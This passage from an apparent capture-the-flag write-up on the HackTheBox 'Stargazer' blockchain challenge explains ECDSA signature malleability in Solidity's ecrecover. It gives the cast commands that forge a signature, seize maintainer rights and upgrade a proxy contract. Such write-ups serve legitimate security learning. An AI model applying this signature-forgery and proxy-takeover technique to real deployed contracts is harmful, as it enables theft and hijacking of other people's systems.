+<p>Specifically, two different valid signatures <span data-latex="inline" data-original-text="(r, s, v)">(r, s, v)</span> and <span data-latex="inline" data-original-text="(r, s’, v’)">(r, s', v')</span>, where <span data-latex="inline" data-original-text="s’ = n – s">s' = n - s</span> and <span data-latex="inline" data-original-text="v’ = v == 28 ? 27 : 28">v' = v \mathrel{==} 28 \; ? \; 27 \; : \; 28</span>, can result in the same recovered address due to ECDSA’s symmetry. This is significant because <code data-token-index="9">_recoverSigner</code> does not enforce uniqueness of signatures:</p> <pre data-language="solidity"><code>function _recoverSigner(bytes32 _message, bytes memory _signature) internal view onlyProxy returns (address) {
+    require(_signature.length == 65, "StargazerKernel: invalid signature length.");
+    bytes32 r;
+    bytes32 s;
+    uint8 v;
+    assembly ("memory-safe") {
+        r := mload(add(_signature, 0x20))
+        s := mload(add(_signature, 0x40))
+        v := byte(0, mload(add(_signature, 0x60)))
+    }
+    require(v == 27 || v == 28, "StargazerKernel: invalid signature version");
+    address signer = ecrecover(_message, v, r, s);
+    require(signer != address(0), "StargazerKernel: invalid signature.");
+    return signer;
+}</code></pre>
+<p><span data-token-index="0">Then, it became apparent that </span><code data-token-index="1">ecrecover</code><span data-token-index="2">’s lack of safeguards against this property was exploitable. Armed with this insight, an attacker can forge a signature using a previous signature recovered through a previous transaction’s event and then computing its prime values for </span><span data-latex="inline" data-original-text="s">s</span><span data-token-index="4"> and </span><span data-latex="inline" data-original-text="v">v</span><span data-token-index="6"> to then creating another PASKATicket spoofing the address of a kernelMaintainer. And then gain maintainer privileges. Once this is achieved, the attacker can upgrade the proxy to point to a custom implementation satisfying the challenge conditions.</span></p> 
+<h2 id="section-6">Exploiting the Stargazer Contract</h2> 
+<p><strong>Step 1: Gathering Initial Information</strong></p><p>The attack begins by retrieving the connection information for the deployed instance. Using the <code data-token-index="1">nc</code> command, we gain access to the player’s private key, address, and the addresses of the target contract (the proxy) and the setup contract</p> <pre data-language="console"><code>ectario@pwnMachine:~/ctf/HackTheBox-university/2024/blockchain_stargazer/local(master⚡) » nc 94.237.50.83 35652
+
+1 - Get connection informations
+2 - Restart Instance
+3 - Get flag
+Select action (enter number): 1
+[*] Found node running. Retrieving connection informations...
+
+Player Private Key : 70a6f8ad1602849d7525b1128237cc470996b2f0aaa099e534e5a03c9cba701f
+Player Address     : 0x3B5FebA9B1EB473bcDa3146B55C9d2d645708af3
+Target contract    : 0x4CAe2e58E18A5a4Bfc2c2375447CB338BfD98382
+Setup contract     : 0x966fE4bF45c7B3f101C2b97570C90893213D8cc7
+</code></pre>
+<p>With this information, we focus on the <code data-token-index="1">Target contract</code> as the primary point of attack.</p> 
+<p><strong>Step 2: Analyzing Events for Signature Extraction</strong></p><p>The next step involves examining the contract’s event logs using <code data-token-index="1">cast logs</code>. From these logs, we identify a signature that can be forged for further exploitation. The critical event contains a valid signature, with the key parameters <span data-latex="inline" data-original-text="r">r</span>, <span data-latex="inline" data-original-text="s">s</span>, and <span data-latex="inline" data-original-text="v">v</span> extracted from the data:</p> <pre data-language="console"><code>ectario@pwnMachine:~/ctf/HackTheBox-university/2024/blockchain_stargazer/local(master⚡) » cast logs --rpc-url http://94.237.50.83:54394
+
+...
+
+- address: 0x4CAe2e58E18A5a4Bfc2c2375447CB338BfD98382
+  blockHash: 0xb710855fbacafb556a72e6d2a89fe4999fe468ba7f3aea19645f35d500b967a2
+  blockNumber: 1
+  data: 0x000000000000000000000000000000000000000000000000000000000000002037793dbbd614689bc7599ee3acced7f981eac27145270f8567c24c8a0989302c000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000411283401990cad63ce4f46f14c5be3f3f7a12d26abece2c5ade99d05dcd5e975d1c1cfa56cd679deb9d75bf0056eaf8fc1e0f4700a98269365a74c3a9beea8a681c00000000000000000000000000000000000000000000000000000000000000
+  logIndex: 2
+  removed: false
+  topics: [
+        0xac1f1e975478fcc6cfcaee7cdf341ebfedaa56f05ac1e364a9097157903da356
+  ]
+  transactionHash: 0x18f8b6b44d9114b47efc43da171d4e7fc2e79dcea980b91767e5ffd9cf2f68d7
+  transactionIndex: 0
+  
+...</code></pre>
+<p><span data-token-index="0">(note: the </span><code data-token-index="1">41</code><span data-token-index="2"> before the signature in the event data corresponds to the length of the signature in bytes, which is 65 bytes. In hexadecimal, </span><code data-token-index="3">0x41</code><span data-token-index="4"> represents the decimal value </span><code data-token-index="5">65</code><span data-token-index="6">)</span></p><p>Here, the original signature components are:</p><ul><li><code data-token-index="0">r = 1283401990cad63ce4f46f14c5be3f3f7a12d26abece2c5ade99d05dcd5e975d</code></li><li><code data-token-index="0">s = 1c1cfa56cd679deb9d75bf0056eaf8fc1e0f4700a98269365a74c3a9beea8a68</code></li><li><code data-token-index="0">v = 1c</code></li></ul><div><p>We calculate a forged signature using ECDSA symmetry <span data-token-index="1">(this is detailed at the end)</span>:</p><ul><li><span data-latex="inline" data-original-text="s’ = n – s">s' = n - s</span>, where <span data-latex="inline" data-original-text="n">n</span> is the secp256k1 curve order.</li><li><span data-latex="inline" data-original-text="v’ = 1b">v' = \mathtt{1b}</span></li></ul><div>Thus, the forged signature is:</div><div> <code data-token-index="0">s’ = 0x1283401990cad63ce4f46f14c5be3f3f7a12d26abece2c5ade99d05dcd5e975de3e305a932986214628a40ffa91507029c9f95e605c63705655d9ae3114bb6d91b</code></div></div> 
+<p><strong>Step 3: Using the Forged Signature to Create a PASKATicket</strong></p><p>With the forged signature, we can call the <code data-token-index="1">createPASKATicket</code> function to generate a valid ticket. This ticket grants maintainer privileges required for subsequent actions:</p> <pre data-language="console"><code>ectario@pwnMachine:~/ctf/HackTheBox-university/2024/blockchain_stargazer/local(master⚡) » cast send 0x4CAe2e58E18A5a4Bfc2c2375447CB338BfD98382 "createPASKATicket(bytes)" --rpc-url http://94.237.50.83:54394 --private-key 70a6f8ad1602849d7525b1128237cc470996b2f0aaa099e534e5a03c9cba701f 0x1283401990cad63ce4f46f14c5be3f3f7a12d26abece2c5ade99d05dcd5e975de3e305a932986214628a40ffa91507029c9f95e605c63705655d9ae3114bb6d91b</code></pre>
+<p>The transaction succeeds, confirming that we now have maintainer privileges.</p> 
+<p><strong>Step 4: Deploying a New Implementation</strong></p><p>Next, we create a custom implementation (<code data-token-index="1">Attack.sol</code> ) that satisfies the <code data-token-index="3">isSolved</code> condition by overriding <code data-token-index="5">getStarSightings</code> to return arrays with at least two elements (we can basically just return an array with 2 elements like <code data-token-index="7">[0, 1]</code> it does the trick). </p> 
+<img alt="" height="391" loading="lazy" src="image-03.png" width="1378"/> 
+<p>Once the new implementation <code data-token-index="1">Attack.sol</code> is deployed, we upgrade the proxy <code data-token-index="3">Stargazer.sol</code> to point to this new logic contract:</p> 
+<img alt="" height="948" loading="lazy" src="image-04.png" width="1462"/> 
+<p><em>We call upgradeToAndCall from Stargazer giving as argument the address of Attack.sol</em></p> <pre data-language="console"><code>ectario@pwnMachine:~/ctf/HackTheBox-university/2024/blockchain_stargazer/local(master⚡) » cast send 0x4CAe2e58E18A5a4Bfc2c2375447CB338BfD98382 "upgradeToAndCall(address,bytes)" --rpc-url http://94.237.50.83:54394 --private-key 70a6f8ad1602849d7525b1128237cc470996b2f0aaa099e534e5a03c9cba701f 0xB6Feb87E7c2786c6978841871c0edf29174D94a9 0x -- --broadcast
+</code></pre>
+<p>The proxy successfully upgrades to our crafted implementation.</p> 
+<p><strong>Step 5: Retrieving the Flag</strong></p><p>Finally, with the new implementation in place, the <code data-token-index="1">isSolved</code> condition is met. We retrieve the flag by selecting the appropriate options:</p> <pre data-language="console"><code>ectario@pwnMachine:~/ctf/HackTheBox-university/2024/blockchain_stargazer/local(master⚡) » nc 94.237.50.83 35652
+1 - Get connection informations
+2 - Restart Instance
+3 - Get flag
+Select action (enter number): 3
+HTB{stargazer_f1nds_s0l4c3_ag41n}</code></pre>
+<h2 id="section-7">Mathematical Explanation of the ecrecover Vulnerability</h2> 
+<p> The <code data-token-index="1">ecrecover</code> function in Solidity recovers a public key from an ECDSA signature <span data-latex="inline" data-original-text="(r,s)">(r,s)</span> and a recovery parameter <span data-latex="inline" data-original-text="v ∈ {27,28}">v \in \{27,28\}</span>. Due to ECDSA’s inherent symmetry, it’s possible to forge a valid signature.</p> 
+<p><strong>1. ECDSA Signature Details</strong></p><p>An ECDSA signature consists of a tuple <span data-latex="inline" data-original-text="(r,s)">(r,s)</span>, where:</p> 
+<span data-latex="block" data-original-text="">\begin{gathered}x \equiv r \pmod{n} \\ k^{-1}(H(m) + r.d) \equiv s \pmod{n}\end{gathered}</span> 
+<p>with:</p><ul><li><span data-latex="inline" data-original-text="n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141">n = \mathtt{0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141}</span>, the order of the secp256k1 curve (source: <a data-token-index="2" href="https://en.bitcoin.it/wiki/Secp256k1" rel="noopener noreferrer" target="_blank"><span>https://en.bitcoin.it/wiki/Secp256k1</span></a>)</li><li><span data-latex="inline" data-original-text="k">k</span>, a random nonce</li><li><span data-latex="inline" data-original-text="H(m)">H(m)</span>, the hash of the message m</li><li><span data-latex="inline" data-original-text="d">d</span>, the private key</li><li><span data-latex="inline" data-original-text="x">x</span>, the x-coordinates of the calculated point <span data-latex="inline" data-original-text="R">R</span> (as we will observe later)</li></ul><div>The public key is <span data-latex="inline" data-original-text="Q = d · G">Q = d \cdot G</span>, where <span data-latex="inline" data-original-text="G">G</span> is the curve’s generator point. During verification, a point <span data-latex="inline" data-original-text="R">R</span> is recomputed:</div> 
+<span data-latex="block" data-original-text="">R = u_1 \cdot G + u_2 \cdot Q</span> 
+<p>where:</p> 
+<span data-latex="block" data-original-text="">\begin{gathered}r \cdot s^{-1} \equiv u_2 \pmod{n} \\ H(m) \cdot s^{-1} \equiv u_1 \pmod{n}\end{gathered}</span> 
+<p>The signature is valid if:</p> 
+<span data-latex="block" data-original-text="">x \equiv r \pmod{n}</span> 
+<p><strong>2. Symmetry of ECDSA Signatures</strong></p><p>For any valid signature <span data-latex="inline" data-original-text="(r,s),">(r,s),</span> there exists another valid signature <span data-latex="inline" data-original-text="(r,s′)">(r,s')</span>, where <span data-latex="inline" data-original-text="s’ = n – s">s' = n - s</span>.<u><b><br/></b></u></p><p><u><b>Proof of validity:</b></u></p><ol><li>Replace <span data-latex="inline" data-original-text="s">s</span> with <span data-latex="inline" data-original-text="s′ = n – s">s' = n - s</span> in the verification equations:<ul><li>The inverse of <span data-latex="inline" data-original-text="s′">s'</span> modulo <span data-latex="inline" data-original-text="n">n</span> is: <span data-latex="inline" data-original-text="(s′)⁻¹ mod n = (n – s)⁻¹ mod n">(s')^{-1} \bmod n = (n - s)^{-1} \bmod n</span>.</li><li>Using modular arithmetic properties, this is equivalent to: <span data-latex="inline" data-original-text="(n – s)⁻¹ mod n = -s⁻¹ mod n">(n - s)^{-1} \bmod n = -s^{-1} \bmod n</span>.</li></ul></li><li>Compute <span data-latex="inline" data-original-text="u₁">u_1</span> and <span data-latex="inline" data-original-text="u₂">u_2</span> with <span data-latex="inline" data-original-text="s′">s'</span>:<ul><li><span data-latex="inline" data-original-text="u₁′ = H(m) · (s′)⁻¹ mod n = H(m) · (-s⁻¹) mod n = -u₁ mod n">u_1' = H(m) \cdot (s')^{-1} \bmod n = H(m) \cdot (-s^{-1}) \bmod n = -u_1 \bmod n</span>,</li><li><span data-latex="inline" data-original-text="u₂′ = r · (s′)⁻¹ mod n = r · (-s⁻¹) mod n = -u₂ mod n">u_2' = r \cdot (s')^{-1} \bmod n = r \cdot (-s^{-1}) \bmod n = -u_2 \bmod n</span>.</li></ul></li><li>Substituting these into the elliptic curve equation for <span data-latex="inline" data-original-text="R">R</span>:<ul><li><span data-latex="inline" data-original-text="R′ = u₁′ · G + u₂′ · Q = (-u₁) · G + (-u₂) · Q">R' = u_1' \cdot G + u_2' \cdot Q = (-u_1) \cdot G + (-u_2) \cdot Q</span>.</li><li>By group properties of elliptic curves: <span data-latex="inline" data-original-text="R′ = -(u₁ · G + u₂ · Q)">R' = -(u_1 \cdot G + u_2 \cdot Q)</span>.</li><li>The point <span data-latex="inline" data-original-text="R′">R'</span> is the negation of <span data-latex="inline" data-original-text="R">R</span>, but its x-coordinate remains the same:<span data-latex="inline" data-original-text=" R′ₓ = Rₓ">R'_x = R_x</span>.Thus, the verification condition <span data-latex="inline" data-original-text="Rₓ mod n = r">R_x \bmod n = r</span> is still satisfied.</li></ul></li></ol> 
+<img alt="" height="658" loading="lazy" src="image-09.png" width="1024"/> 
+<p><span data-token-index="0"> (note: the curve used here is just an example, not the real one)</span></p> 
+<p><strong>3. The Role of v in Solidity’s <span data-token-index="1">ecrecover</span><!-- notionvc: 23da689b-706f-4597-9f4b-0eda15f120ed --></strong></p><p>The <code data-token-index="1">ecrecover</code> function uses a recovery parameter <span data-latex="inline" data-original-text="v">v</span> to indicate which of two possible public keys to recover. The value of <span data-latex="inline" data-original-text="v">v</span> determines whether to use the original elliptic curve point <span data-latex="inline" data-original-text="R">R</span> or its negation <span data-latex="inline" data-original-text="-R">-R</span> during recovery:</p><ul><li><span data-latex="inline" data-original-text="v = 27">v = 27</span>: Corresponds to <span data-latex="inline" data-original-text="R">R</span></li><li><span data-latex="inline" data-original-text="v = 28">v = 28</span>: Corresponds to <span data-latex="inline" data-original-text="-R">-R</span></li></ul><div>If a valid signature <span data-latex="inline" data-original-text="(r, s, v)">(r, s, v)</span> is known with <span data-latex="inline" data-original-text="v = 27">v = 27</span> for example, one can construct another signature <span data-latex="inline" data-original-text="(r, s′ = n – s, v’)">(r, s' = n - s, v')</span> with <span data-latex="inline" data-original-text="v’ = 28">v' = 28</span>, as the verification condition remains valid for both cases.</div> 
